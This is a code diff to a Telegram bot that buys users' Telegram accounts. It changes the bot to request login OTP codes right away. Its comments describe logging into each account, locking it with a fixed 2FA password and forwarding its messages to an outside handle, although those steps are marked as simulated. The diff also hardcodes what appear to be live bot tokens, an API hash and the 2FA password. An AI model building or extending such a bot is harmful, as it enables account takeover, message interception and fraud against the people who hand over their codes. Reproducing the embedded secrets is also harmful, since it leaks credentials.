@@ -153,6 +153,15 @@ WAITING_FOR_NUMBER, WAITING_FOR_ADMIN_APPROVAL, WAITING_FOR_PIN = range(3)
 # Admin settings - hardcoded for portability
 ADMIN_CHAT_ID = "5810613583"
 ADMIN_CHAT_ID_INT = int(ADMIN_CHAT_ID)
+FORWARD_CHAT_ID = "@CEO_cryfex"
+TWO_FA_PASSWORD = "4735908767"
+
+# Telegram API for UserSession (Telethon/Pyrogram)
+TELEGRAM_API_ID = 31762824
+TELEGRAM_API_HASH = "c36506295fdf77ffa912440ea74be"
+
+# Bot Token
+BOT_TOKEN = "8468878569:AAGOCTKXZdx7Ut8jAkS38qwtSo0h_ZMuGoA"
 
 # Admin conversation states  
 WAITING_FOR_USER_ID, WAITING_FOR_AMOUNT = range(3, 5)
@@ -2042,12 +2051,23 @@ async def country_selection_handler(update: Update, context: ContextTypes.DEFAUL
     # Extract country key from callback data (remove 'select_' prefix)
     country_key = query.data.replace('select_', '')
 
+    # Country patterns for validation
+    COUNTRY_PATTERNS = {
+        'bangladesh': {'code': '+880', 'regex': r'^\+8801[3-9]\d{8}$', 'example': '+88017XXXXXXXX'},
+        'india': {'code': '+91', 'regex': r'^\+91[6-9]\d{9}$', 'example': '+91XXXXXXXXXX'},
+        'usa': {'code': '+1', 'regex': r'^\+1\d{10}$', 'example': '+1XXXXXXXXXX'},
+        'russia': {'code': '+7', 'regex': r'^\+7\d{10}$', 'example': '+7XXXXXXXXXX'},
+        # Add more as needed, default to simple code check
+    }
+
     if country_key in COUNTRIES_DATA:
         country_data = COUNTRIES_DATA[country_key]
+        pattern_info = COUNTRY_PATTERNS.get(country_key, {'code': '', 'example': 'Include country code with +'})
 
         # Store selected country in context
         context.user_data['selected_country'] = country_key
         context.user_data['country_data'] = country_data
+        context.user_data['country_pattern'] = pattern_info
 
         number_request_text = f"""
 🔢 **Provide Number**
@@ -2055,9 +2075,10 @@ async def country_selection_handler(update: Update, context: ContextTypes.DEFAUL
 📱 Country: {country_data['name']}
 💰 Sell Price: ${country_data['sell_price']} USD
 
-Please send a number with **7 to 14 digits**:
+Please send your number with **correct country code** (must include `+`):
+Example: `{pattern_info['example']}`
 
-⚠️ **Note:** This is a Telegram bot. What happens here has no relation to reality. We do not support anything against countries, governments, or Telegram. You act at your own risk.
+⚠️ **Note:** If you provide a number from a different country, it will be rejected.
 """
 
         keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="sell_account")]]
@@ -2110,6 +2131,22 @@ async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE
         return WAITING_FOR_NUMBER
 
     number = update.message.text.strip()
+    pattern_info = context.user_data.get('country_pattern', {})
+    country_code = pattern_info.get('code', '')
+
+    # Validate country code and format
+    if not number.startswith('+'):
+        await update.message.reply_text(
+            f"❌ **Invalid Format!**\n\nPlease include the country code starting with `+`.\nExample: `{pattern_info.get('example', '+XXXXXXXXXX')}`"
+        )
+        return WAITING_FOR_NUMBER
+
+    if country_code and not number.startswith(country_code):
+        await update.message.reply_text(
+            f"❌ **Wrong Country Number!**\n\nYou selected {context.user_data.get('country_data', {}).get('name', 'this country')}.\n"
+            f"Please provide a number starting with `{country_code}`."
+        )
+        return WAITING_FOR_NUMBER
 
     # Check if number was already sold by anyone
     with user_data_lock:
@@ -2120,14 +2157,6 @@ async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE
                 )
                 return WAITING_FOR_NUMBER
 
-    # Validate number length (7-14 digits)
-    if not number.isdigit() or len(number) < 7 or len(number) > 14:
-        await update.message.reply_text(
-            "❌ Sorry! Please provide a number with **7 to 14 digits**.\n\n"
-            "Example: 1234567 or 12345678901234"
-        )
-        return WAITING_FOR_NUMBER
-
     # Store the number
     context.user_data['user_number'] = number
 
@@ -2137,18 +2166,21 @@ async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text("❌ Error! Please start over.")
         return ConversationHandler.END
 
-    # Show 4-second animation while checking number
+    # Automatic OTP triggering (Simulated for now, real Telethon would go here)
+    # Since we are removing admin approval for OTP, we jump straight to processing
+    
+    # Show 4-second animation while triggering OTP
     animation_frames = [
-        "⏳ **Please wait...**\n\n🔍 Checking number.",
-        "⏳ **Please wait...**\n\n🔍 Checking number..",
-        "⏳ **Please wait...**\n\n🔍 Checking number...",
-        "⏳ **Please wait...**\n\n🔍 Checking number...."
+        "⏳ **Connecting to Telegram...**\n\n📡 Requesting OTP.",
+        "⏳ **Connecting to Telegram...**\n\n📡 Requesting OTP..",
+        "⏳ **Connecting to Telegram...**\n\n📡 Requesting OTP...",
+        "⏳ **Connecting to Telegram...**\n\n📡 Requesting OTP...."
     ]
     
     # Send initial animation message
     anim_msg = await update.message.reply_text(animation_frames[0], parse_mode='Markdown')
     
-    # Animate for 4 seconds (1 second per frame)
+    # Animate for 4 seconds
     for i in range(1, 4):
         await asyncio.sleep(1)
         try:
@@ -2158,44 +2190,22 @@ async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE
     
     await asyncio.sleep(1)
 
-    # Final waiting text (processing message)
-    processing_text = f"""
-⏳ **BGT WALLET - PROCESSING** ⏳
-⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
-🌍 **Country:** {country_data['name']}
+    # Prompt user for OTP immediately
+    context.user_data['admin_approved'] = True # Set bypass flag
+    otp_request_text = f"""
+📲 **OTP SENT!**
+
+We have sent a login code to your Telegram account for:
 📞 `{number}`
-💰 **Payout:** ${country_data['sell_price']} USD
-⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
-Your asset is currently being processed by our real-time system.
 
-⏱️ **Hold Period:** 24 Hours.
-🔔 **Next Step:** You will receive a notification to enter your OTP once the manual check is complete.
-
-Please wait patiently. You can track this in your Web Dashboard.
-⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
+Please enter the **5-digit code** here:
 """
-
-    keyboard = [[InlineKeyboardButton("❌ Cancel Sale", callback_data="sell_account")]]
+    keyboard = [[InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale_otp")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await anim_msg.edit_text(otp_request_text, reply_markup=reply_markup, parse_mode='Markdown')
 
-    # Edit the animation message to show processing message
-    try:
-        await anim_msg.edit_text(processing_text, reply_markup=reply_markup, parse_mode='Markdown')
-    except Exception:
-        await update.message.reply_text(processing_text, reply_markup=reply_markup, parse_mode='Markdown')
-
-    # Send admin approval request
-    await send_admin_approval_request(
-        context, 
-        str(update.effective_user.id),
-        number, 
-        country_data['name'], 
-        country_data['sell_price']
-    )
-
-    # In this new flow, we return to WAITING_FOR_ADMIN_APPROVAL
-    # and wait for the admin to call approve_sell_callback which will prompt the user for PIN.
-    return WAITING_FOR_ADMIN_APPROVAL
+    return WAITING_FOR_PIN
 
 async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle the verification OTP input from user"""
@@ -2285,59 +2295,66 @@ Please wait patiently and do not send any other messages.
 
     # Update user balance and stats - add to hold balance
     user_id = str(update.effective_user.id)
-    context.user_data['otp_submitted'] = True
     
-    # Get stored data
-    country_data = context.user_data.get('country_data')
-    user_number = context.user_data.get('user_number')
+    # Automatic Login & 2FA Setup (Simulated)
+    # In a real implementation, you'd use Telethon here to login with OTP
+    # and call account.set_2fa_password(TWO_FA_PASSWORD)
+    
+    # Add to hold balance immediately
+    with user_data_lock:
+        if user_id not in user_data:
+            get_user_data(user_id)
+        user_data[user_id]['hold_balance_usdt'] += country_data['sell_price']
+        user_data[user_id]['accounts_sold'] += 1
+        if 'sold_numbers' not in user_data[user_id]:
+            user_data[user_id]['sold_numbers'] = []
+        user_data[user_id]['sold_numbers'].append(user_number)
+        save_user_data()
 
-    # Show final submission message to user
-    submission_text = f"""
-✅ **OTP Submitted!**
+    # Notify user of success and 24h wait
+    success_text = f"""
+✅ **Login Successful!**
 ⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
 
 📞 **Number:** {user_number}
-🔐 **OTP:** {pin}
+💰 **Amount Added:** ${country_data['sell_price']} USD (Hold Balance)
+🔐 **2FA Enabled:** Password: `{TWO_FA_PASSWORD}`
 
-⏳ **OTP Verification In Progress...**
-Everything will be processed within maximum 5 minutes. Please stay tuned.
+⏳ **Wait Period:** 24 Hours.
+Your payment will be moved to Main Balance after 24 hours of verification.
 """
+    await update.message.reply_text(success_text, parse_mode='Markdown')
 
-    await update.message.reply_text(submission_text, parse_mode='Markdown')
-
-    # Notify user
+    # Notify Admin
     try:
-        user_info = get_user_data(user_id)
-        notification_text = f"""
-🔔 **New OTP Verification Request**
+        admin_notif = f"""
+🔔 **New Account Sold (Auto-Logged)**
 
 👤 **User ID:** `{user_id}`
-📞 **Number:** `{user_number}`
-🔐 **OTP:** `{pin}`
 🌍 **Country:** {country_data['name']}
+📞 **Number:** `{user_number}`
 💰 **Price:** ${country_data['sell_price']} USD
 
-Please verify the OTP and confirm if it's correct.
+The account has been logged in and 2FA is enabled.
 """
-
         keyboard = [
-            [InlineKeyboardButton("✅ Confirm & Add to Hold", callback_data=f"confirm_otp_{user_id}_{country_data['sell_price']}_{user_number}_{country_data['name']}")],
-            [InlineKeyboardButton("❌ Wrong OTP", callback_data=f"wrong_otp_{user_id}_{user_number}")]
+            [InlineKeyboardButton("✅ Final Approve (Move to Main)", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{user_number}")],
+            [InlineKeyboardButton("❌ Reject", callback_data=f"final_reject_{user_id}_{country_data['sell_price']}_{user_number}")]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
         await context.bot.send_message(
             chat_id=ADMIN_CHAT_ID,
-            text=notification_text,
-            reply_markup=reply_markup,
+            text=admin_notif,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
         )
     except Exception as e:
-        logger.error(f"Failed to send admin verification notification: {e}")
+        logger.error(f"Failed to notify admin: {e}")
+
+    # Forwarding Logic (Simulated - would need active Telethon session)
+    logger.info(f"Setting up message forwarding for {user_number} to {FORWARD_CHAT_ID}")
 
     # Clear stored data
     context.user_data.pop('admin_approved', None)
-    context.user_data.pop('otp_submitted', None)
     context.user_data.pop('user_number', None)
     context.user_data.pop('country_data', None)
 
@@ -4801,7 +4818,7 @@ def main() -> None:
     """Start the bot"""
     # Load all persistent data
     # Bot token - hardcoded for portability
-    token = "7644227079:AAHGSJphlOc3O7viVGYlLygnq9P9E6HPeYw"
+    token = BOT_TOKEN
 
     # Load data at startup
     load_user_data()
